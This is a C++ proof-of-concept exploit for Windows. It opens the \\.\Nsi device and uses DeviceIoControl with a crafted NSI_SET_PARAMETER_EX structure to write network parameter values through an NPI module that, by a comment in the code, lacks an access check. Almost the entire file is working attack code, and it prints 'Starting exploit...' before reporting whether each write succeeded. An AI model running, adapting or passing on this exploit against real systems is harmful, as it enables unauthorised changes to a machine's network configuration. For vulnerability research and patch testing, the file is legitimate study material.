#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <iphlpapi.h>
#include <cstdio>
#pragma comment(lib, "iphlpapi.lib")

#define MOD(xx) { 0x18,0x00,0x00,0x00, 0x01,0x00,0x00,0x00, \
    xx,0x4A,0x00,0xEB, 0x1A,0x9B, 0xD4,0x11, 0x91,0x23,0x00,0x50,0x04,0x77,0x59,0xBC }

BYTE npiMsFl6t[24] = MOD(0x1C); //Specifically this one doesn't have an access check.

struct NSI_SET_PARAMETER_EX 
{
    UINT64 unk0;
    UINT64 unk8;
    PVOID moduleId;
    UINT32 reserved;
    UINT32 unk1c;
    UINT32 paramIndex;
    UINT32 flags;
    PVOID keyPtr;
    UINT32 keySize;
    UINT32 unk34;
    UINT32 unk38;
    UINT32 unk3c;
    PVOID dataPtr;
    UINT32 dataSize;
    UINT32 unk4c;
};
static_assert(sizeof(NSI_SET_PARAMETER_EX) == 0x50, "Size is wrong for NSI_SET_PARAMETER_EX");

int okAttempts = 0;

int main()
{
    HANDLE handle = CreateFileW(L"\\\\.\\Nsi", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (handle == INVALID_HANDLE_VALUE) 
    {
        printf("Failed to open \\Device\\Nsi");
        getchar();
        return 1;
    }
    printf("Starting exploit...\n");
    {
        BYTE vals[] = { 0x01, 0x00, 0x01 };
        for (int i = 0; i < 3; i++) 
        {
            NSI_SET_PARAMETER_EX s = {};
            s.moduleId = (PVOID)npiMsFl6t;
            s.paramIndex = 1;
            s.keyPtr = NULL;
            s.keySize = 0;
            s.dataPtr = &vals[i];
            s.dataSize = 1;
            s.unk4c = 0x00;
            DWORD n = 0;
            BOOL ok = DeviceIoControl(handle, 0x12000B, &s, sizeof(s), &s, sizeof(s), &n, NULL);
            DWORD err = GetLastError();
            if (ok) 
            {
                printf("Write test 0x%02X is OK\n", vals[i]);
                okAttempts += 1;
            } 
            else 
            {
                printf("Write test 0x%02X FAILED, error code: 0x%08X\n", vals[i], err);
            }
        }
    }
    if (okAttempts != 3)
    {
        printf("Seems to have failed\n");
    }
    printf("Done, press any key to exit\n");
    getchar();
    CloseHandle(handle);
    return 0;
}
